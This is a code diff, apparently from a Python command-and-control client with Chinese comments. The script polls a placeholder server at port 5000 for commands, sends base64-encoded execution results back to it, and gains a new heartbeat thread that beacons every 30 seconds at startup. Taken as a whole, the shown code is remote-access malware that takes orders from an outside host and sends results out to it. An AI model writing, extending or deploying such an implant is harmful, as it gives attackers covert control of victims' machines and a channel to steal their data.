@@ -7,10 +7,9 @@ import re
 import threading
 import base64
 
-#把serverip 替换成对应服务器ip
 
 def receive(id):
-	url="http://serverip:5000/c2client?cmd="+str(id)
+	url="http://ip:5000/c2client?cmd="+str(id)
 	#print url
 	# 接收待执行命令
 	try:
@@ -19,6 +18,7 @@ def receive(id):
 			s1= requests.get(url, timeout=10)
 			#print s1.status_code
 			if s1.status_code == 200:
+				#正则匹配内容
 				command= s1.content
 				#print command
 				return command
@@ -30,7 +30,7 @@ def receive(id):
 def send(result):
 	r1=result
 	#print r1
-	url="http://serverip:5000/c2client?results="#+base64.b64encode(str(r1))
+	url="http://ip:5000/c2client?results="#+base64.b64encode(str(r1))
 	data = {"results": base64.b64encode(str(r1))}
 	#print url
 	# 命令执行结束的回显发送
@@ -60,7 +60,28 @@ def cmd(command):
 
 
 
+
+def heartbeats():
+	while True:
+		url="http://ip:5000/c2heartbeat?client="+str(time.time())
+		url0="http://ip:5000/c2heartbeat?control="+str(time.time())
+		# 每30秒发一次心跳包
+		try:
+			while True:
+				s0= requests.get(url0, timeout=5)
+				s1= requests.get(url, timeout=5)
+				if s1.status_code == 200:
+					break
+				time.sleep(1)
+		except:
+			return
+		time.sleep(30)
+
+
 if __name__ == '__main__':
+	#启动心跳线程
+	t = threading.Thread(target=heartbeats)
+	t.start()
 	i=0
 	while True:
 		i+=1
